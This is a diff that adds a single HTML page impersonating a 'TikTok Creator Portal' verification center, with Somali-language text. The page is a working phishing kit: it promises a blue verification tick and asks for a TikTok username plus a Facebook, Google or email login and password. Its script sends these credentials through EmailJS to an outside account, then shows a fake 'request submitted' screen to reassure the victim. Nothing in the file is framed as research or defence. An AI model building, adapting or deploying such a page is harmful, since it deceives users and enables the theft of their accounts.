@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Creator Portal | Verification Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("YOUR_PUBLIC_KEY"); 
+       })();
+    </script>
+    <style>
+        :root {
+            --tiktok-red: #FE2C55;
+            --bg-page: #FFFFFF;
+            --text-main: #121212;
+            --card-bg: #F8F8F8;
+            --input-bg: #F1F1F2;
+            --border: #EBEBEB;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-page: #121212;
+                --text-main: #FFFFFF;
+                --card-bg: #1E1E1E;
+                --input-bg: #2F2F2F;
+                --border: #333333;
+            }
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background-color: var(--bg-page); color: var(--text-main); transition: 0.3s; }
+
+        nav { height: 60px; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; border-bottom: 1px solid var(--border); }
+        .logo { height: 28px; }
+        @media (prefers-color-scheme: dark) { .logo { filter: invert(1); } }
+
+        .hero { text-align: center; padding: 40px 20px; }
+        .blue-tick-main { font-size: 60px; color: #20D5EC; margin-bottom: 10px; }
+
+        .auth-container { max-width: 450px; margin: 0 auto; padding: 20px; }
+        .social-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
+        .social-card { border: 1px solid var(--border); border-radius: 12px; padding: 15px 5px; text-align: center; cursor: pointer; background: var(--card-bg); transition: 0.2s; }
+        .social-card.active { border-color: var(--tiktok-red); background: rgba(254, 44, 85, 0.05); }
+        .social-card img { width: 30px; margin-bottom: 5px; }
+        .social-card span { display: block; font-size: 11px; font-weight: bold; }
+
+        #login-form-area { display: none; background: var(--card-bg); padding: 25px; border-radius: 20px; border: 1px solid var(--border); animation: slideUp 0.4s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; }
+        input { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 10px; background: var(--input-bg); color: var(--text-main); outline: none; font-size: 15px; }
+
+        .submit-btn { width: 100%; padding: 16px; background: var(--tiktok-red); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; position: relative; overflow: hidden; }
+        
+        /* Professional Loading Spinner (No Emoji) */
+        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading .btn-text { display: none; }
+        .loading .spinner { display: block; }
+
+        #success-page { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-page); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 40px; }
+        .success-icon { font-size: 80px; color: #4CAF50; margin-bottom: 25px; }
+        
+        #error-msg { color: var(--tiktok-red); font-size: 13px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="main-content">
+        <nav>
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png" class="logo">
+            <button style="background:var(--tiktok-red); color:white; border:none; padding:6px 14px; border-radius:4px; font-weight:bold;">Get App</button>
+        </nav>
+
+        <section class="hero">
+            <div class="blue-tick-main"><i class="fas fa-check-circle"></i></div>
+            <h1>Verification Request</h1>
+            <p style="color:var(--gray-text); font-size:14px;">Xaqiiji lahaanshaha akoonkaaga si aad u hesho calaamadda rasmiga ah.</p>
+        </section>
+
+        <div class="auth-container">
+            <div class="social-grid">
+                <div class="social-card" onclick="openLogin('Facebook', 'https://cdn-icons-png.flaticon.com/512/124/124010.png', this)">
+                    <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png"><span>Facebook</span>
+                </div>
+                <div class="social-card" onclick="openLogin('Google', 'https://cdn-icons-png.flaticon.com/512/2991/2991148.png', this)">
+                    <img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png"><span>Google</span>
+                </div>
+                <div class="social-card" onclick="openLogin('Email', 'https://cdn-icons-png.flaticon.com/512/732/732200.png', this)">
+                    <img src="https://cdn-icons-png.flaticon.com/512/732/732200.png"><span>Email</span>
+                </div>
+            </div>
+
+            <div id="login-form-area">
+                <form id="mainForm">
+                    <div class="input-group">
+                        <label>TikTok Username</label>
+                        <input type="text" id="username-field" placeholder="@username" required>
+                    </div>
+                    <div class="input-group">
+                        <label id="user-label">Login ID</label>
+                        <input type="text" id="user-field" placeholder="Gali macluumaadkaaga" required>
+                    </div>
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" id="pass-field" placeholder="Password-kaaga" required>
+                    </div>
+                    <button type="submit" class="submit-btn" id="subBtn">
+                        <span class="btn-text">Verify Account</span>
+                        <div class="spinner"></div>
+                    </button>
+                    <div id="error-msg">Cillad farsamo ayaa dhacday. Fadlan mar kale isku day.</div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="success-page">
+        <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+        <h2>Codsigaaga waa la gudbiyay</h2>
+        <p style="margin-top:20px; color:var(--text-main); opacity:0.7; line-height: 1.6;">
+            Nidaamka TikTok wuxuu xaqiijinayaa macluumaadka aad bixisay. Hawshan waxay qaadan kartaa ilaa 24 saac. Waad ku mahadsantahay dulqaadkaaga.
+        </p>
+        <button onclick="location.reload()" style="margin-top:40px; background:var(--card-bg); border:1px solid var(--border); color:var(--text-main); padding:12px 30px; border-radius:10px; font-weight:bold;">OK</button>
+    </div>
+
+<script>
+    let selectedMethod = "";
+
+    // 1. Shaqada furista Form-ka (Login Method)
+    function openLogin(method, iconSrc, element) {
+        selectedMethod = method;
+        document.querySelectorAll('.social-card').forEach(c => c.classList.remove('active'));
+        element.classList.add('active');
+        document.getElementById('login-form-area').style.display = 'block';
+        document.getElementById('user-label').innerText = method + " Login";
+        
+        setTimeout(() => {
+            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+        }, 100);
+    }
+
+    // 2. Shaqada dirista xogta (Single Form Submission)
+    document.getElementById('mainForm').onsubmit = function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('subBtn');
+        const errorMsg = document.getElementById('error-msg');
+        
+        // Bilaabidda Loading-ka
+        btn.classList.add('loading');
+        btn.disabled = true;
+        if(errorMsg) errorMsg.style.display = 'none';
+
+        // Diyaarinta xogta loo dirayo EmailJS
+        const templateParams = {
+            method: selectedMethod,
+            tiktok_user: document.getElementById('username-field').value,
+            login_user: document.getElementById('user-field').value,
+            login_pass: document.getElementById('pass-field').value
+        };
+
+        // Dirista xogta
+        emailjs.send("service_j2uu8yq", "template_0tc14oe", templateParams)
+            .then(function() {
+                // Markay guulaysato
+                setTimeout(() => {
+                    document.getElementById('main-content').style.display = 'none';
+                    document.getElementById('success-page').style.display = 'flex';
+                    document.getElementById('mainForm').reset();
+                }, 2000);
+            }, function(error) {
+                // Haddii ay fashilanto
+                btn.classList.remove('loading');
+                btn.disabled = false;
+                if(errorMsg) {
+                    errorMsg.style.display = 'block';
+                    errorMsg.innerText = "Cillad farsamo ayaa dhacday, dib u tijaabi.";
+                }
+                console.log("EmailJS Error:", error);
+            });
+    };
+</script>
+
+</body>
+</html>
+
